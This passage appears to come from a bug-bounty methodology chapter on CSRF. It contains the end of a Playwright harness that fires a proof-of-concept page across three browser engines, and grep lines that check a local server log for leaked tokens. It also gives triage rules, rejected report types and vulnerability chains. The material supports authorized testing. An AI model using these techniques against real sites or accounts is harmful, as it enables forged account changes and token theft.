  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  for e in chromium firefox webkit; do LAXWAIT=0 python3 "$E/tools/csrf-fire.py" poc.html "$D" $e "${HDR[@]}"; done   # a GET subresource: no wait
  grep -o 'GET /leak?[^ ]*' "$D/server.log" | cut -c1-200; grep 'callback=csr012' "$D/browser.log"
  ```
- **Proof:** the attacker page on `127.0.0.1` displaying B's e-mail or token (the screenshot), the `server.log`
  line where it reached our server, the target response's `Content-Type`, the cookie's `Set-Cookie` line and the
  engine. With a token, the forged account change that uses it (CSR-008) completes the chain and the severity.
- **Not a finding when:** the data is public or the same for everyone. The response is `application/json`: it is
  refused as a script, and no current browser lets a page read a JSON array by redefining constructors. The
  response carries `Cross-Origin-Resource-Policy: same-origin` or `same-site`. The cookie is `Lax` or `Strict`
  (CSR-001), so the script gets the logged-out answer; a same-site foothold still reads it (CSR-011). Only
  Chromium reads it: still a valid report; say so.
- **Escalate:** a stolen token drives CSR-003 or CSR-008 from the same page. A callback name reflected into a
  script on the target's own pages is XSS (XSS chapter), and an allow-listed JSONP endpoint defeats a CSP
  (XSS-015).

## Graveyard

- **A missing token on an action that changes nothing that matters**: newsletter, theme, language, dismiss, add
  to cart, like, follow, mark as read (`csrf-low`). Site-wide missing tokens are one report for the whole
  application; one report per form is closed as a duplicate of the first.
- **Login CSRF and logout CSRF** (`csrf-low`). Where login CSRF is paid alone it is rated low (#834366, $500);
  otherwise it pays only as part of a chain (CSR-010). Logout CSRF alone is not paid.
- **"No CSRF token in the form" or "cookie without SameSite"** with no forged change shown: a header observation
  or scanner output (`missing-headers`, `automated`).
- **A replay with curl.** curl applies neither SameSite nor CORS. Without a page that worked in a browser it is
  N/A.
- **CSRF on JSON or GraphQL endpoints that accept only `application/json` or require a custom header.** No page
  can send that without a preflight the server refuses; N/A. The content-type tricks that pay (a `text/plain` or
  form body accepted by a JSON route) are API-006, and GraphQL mutations over GET or form are GQL-008; this
  chapter does not repeat those cards. GraphQL CSRF on queries alone changes nothing (N/A), and on login or
  logout mutations it is `csrf-low`.
- **A page that works only in Chromium within two minutes of login** (the Lax+POST exception): informative unless
  a route re-issues the cookie on demand (CSR-001).
- **Flash, `crossdomain.xml` and 307-redirect header forging.** No current browser runs Flash; N/A.
- **A CSRF token in a URL, sent through `Referer` to analytics or a CDN.** Browsers default to
  `strict-origin-when-cross-origin`, which strips the query cross-origin, and the vendor is not the attacker;
  informative.
- **A token that is not rotated at login or stays the same for the whole session** (#49974, $50): informative
  without a way to learn or fix it.
- **A token readable only with a network position, or only over plain HTTP** (`mitm`). #15412 was paid $1,000
  for exactly that in 2014; programmes that list `mitm` close it today.
- **CSRF that needs the victim to type, paste or drag** (`social-engineering`), or a click inside a framed page
  (`clickjacking`: UIR chapter).
- **CSRF on a third-party widget or SaaS page under the domain** (`third-party`).
- **Self-CSRF**: the forged request changes the attacker's own account. There is no victim; N/A.

## Chains

- CSR-001 (`Lax`) → CSR-005, CSR-009: GET actions and OAuth callbacks ride `Lax` cookies.
- CSR-002, CSR-003, CSR-005, CSR-006, CSR-007 → CSR-008: every bypass aimed at the account-change endpoints. AUT-015
  (no current password asked) is what makes CSR-008 a takeover.
- XSS or STO on a sibling host → CSR-011 (same-site requests) and CSR-004 (planting the double-submit cookie). CRL
  (`Set-Cookie` injection) → CSR-004.
- CSR-012 (token read cross-site) → CSR-008. COR (a CORS policy that trusts our origin with credentials) and CCH
  (a cached page holding B's token) read the token the same way.
- CSR-010 + a self-XSS in A's account (XSS chapter) → script in B's browser on the target's origin. CSR-002 + a
  field that renders unescaped → stored XSS in B's account.
- CSR-009 → OAU: `state` and redirect handling in the sign-in flow; AUT-013 for pre-account takeover.
- API-006 (JSON routes that accept form, `text/plain` or GET) and GQL-008 (GraphQL mutations over GET or form):
  the content-type cases of this class.
- CSD (client-side path traversal): the application's own script sends an authenticated request, with its token
  or header, to a path the attacker chooses; CSRF without breaking the token.
- WSS (cross-site WebSocket hijacking): the WebSocket handshake is a cookie-authenticated cross-site request.
- UIR: when a token blocks the forged request, a framed one-click action may still work.
- RDR: a client-side redirect on the target turns a cross-site navigation into a same-site one (CSR-006 `Referer`
  checks, `Strict` cookies in CSR-001).

## Sources

- `kb/reports/csrf.md` and `kb/reports/all/csrf.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"CSRF"}`, `find_bypasses {"protection":"csrf token"}`,
  `find_bypasses {"protection":"samesite"}`, `find_payloads {"topic":"Cross-Site Request Forgery"}`.
- PortSwigger Web Security Academy, CSRF: token validation flaws, SameSite restrictions, Referer-based defences.
- OWASP Cross-Site Request Forgery Prevention Cheat Sheet; OWASP WSTG-SESS-05.
- RFC 6265bis (`SameSite`, cookie prefixes); the Fetch Standard (CORS-safelisted methods, headers and content
  types; when the `Origin` header is sent and when it is `null`); the Chromium "SameSite Updates" notes (Lax by
  default and the two-minute Lax+POST exception).
- Playwright for Python: `BrowserType.launch_persistent_context`, `BrowserContext.add_cookies`,
  `Request.all_headers`.
